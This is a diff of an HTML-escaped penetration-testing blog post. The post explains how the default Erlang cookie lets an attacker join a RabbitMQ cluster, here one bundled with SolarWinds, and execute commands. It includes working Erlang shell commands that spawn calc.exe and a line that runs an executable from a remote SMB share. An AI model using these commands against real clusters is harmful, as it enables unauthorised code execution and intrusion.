@@ -31,7 +31,7 @@
 &lt;li&gt;&lt;a href=&#34;https://www.rabbitmq.com/clustering.html#erlang-cookie&#34;&gt;https://www.rabbitmq.com/clustering.html#erlang-cookie&lt;/a&gt;&lt;/li&gt;
 &lt;/ul&gt;
 &lt;p&gt;Example &lt;code&gt;.erlang.cookie&lt;/code&gt; file:&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;rabbit
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;rabbit
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;One Windows for Solar Winds it can be found in &lt;strong&gt;Program Data&lt;/strong&gt;:&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://malicious.link/images/2018/erlang_sw_cookie.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
 &lt;h3 id=&#34;the-cluster-name&#34;&gt;The Cluster Name&lt;/h3&gt;
@@ -47,24 +47,24 @@
 &lt;li&gt;&lt;code&gt;WIN-PM0ID6F0AHN&lt;/code&gt; is the hostname I&amp;rsquo;m connecting to the cluster via&lt;/li&gt;
 &lt;/ul&gt;
 &lt;p&gt;&lt;strong&gt;Start up Erlang with &lt;code&gt;erl -sname test&lt;/code&gt;&lt;/strong&gt;:&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;root@kali:~# erl -sname test
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;root@kali:~# erl -sname test
 Erlang/OTP 18 [erts-7.3.1.2] [source] [64-bit] [async-threads:10] [kernel-poll:false]
 
 Eshell V7.3.1.2  (abort with ^G)
 (test@kali)1&amp;gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Connecting to the cluster (the period on the end of the commands important terminators)&lt;/strong&gt;:&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;(test@kali)1&amp;gt; net_kernel:connect(&#39;rabbit@WIN-PM0ID6F0AHN&#39;).
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;(test@kali)1&amp;gt; net_kernel:connect(&amp;#39;rabbit@WIN-PM0ID6F0AHN&amp;#39;).
 true
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;If you get a &lt;code&gt;true&lt;/code&gt; that means the connection was successful.&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;Code exeuction (starting calc of course)&lt;/strong&gt;:&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;(test@kali)2&amp;gt; erlang:spawn(&#39;rabbit@WIN-PM0ID6F0AHN&#39;,os,cmd,[&amp;quot;calc.exe&amp;quot;]).
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;(test@kali)2&amp;gt; erlang:spawn(&amp;#39;rabbit@WIN-PM0ID6F0AHN&amp;#39;,os,cmd,[&amp;#34;calc.exe&amp;#34;]).
 &amp;lt;6867.30570.461&amp;gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;And so, like any good code execution attack, &lt;code&gt;calc.exe&lt;/code&gt; is executed:&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://malicious.link/images/2018/erlang_sw_calc.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
 &lt;p&gt;On Windows of course you can even do SMB shares:&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;erlang:spawn(&#39;rabbit@WIN-PM0ID6F0AHN&#39;,os,cmd,[&amp;quot;\\\\192.168.80.69\\share\\runme.exe&amp;quot;]).
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;erlang:spawn(&amp;#39;rabbit@WIN-PM0ID6F0AHN&amp;#39;,os,cmd,[&amp;#34;\\\\192.168.80.69\\share\\runme.exe&amp;#34;]).
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Exiting the &lt;strong&gt;Erlang Shell&lt;/strong&gt; is done with the init::stop function:&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;(test@kali)3&amp;gt; init:stop().
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;(test@kali)3&amp;gt; init:stop().
 ok
 (test@kali)4&amp;gt; root@kali:~#
 &lt;/code&gt;&lt;/pre&gt;&lt;h4 id=&#34;warning-by-running-this-code-execution-method-you-are-running-a-node-as-well-as-as-long-as-you-have-the-connection-open-you-can-be-exploited-the-same-way-you-are-exploiting-the-remote-host&#34;&gt;Warning: By running this code execution method you are running a node as well, as as long as you have the connection open, you can be exploited the same way you are exploiting the remote host.&lt;/h4&gt;
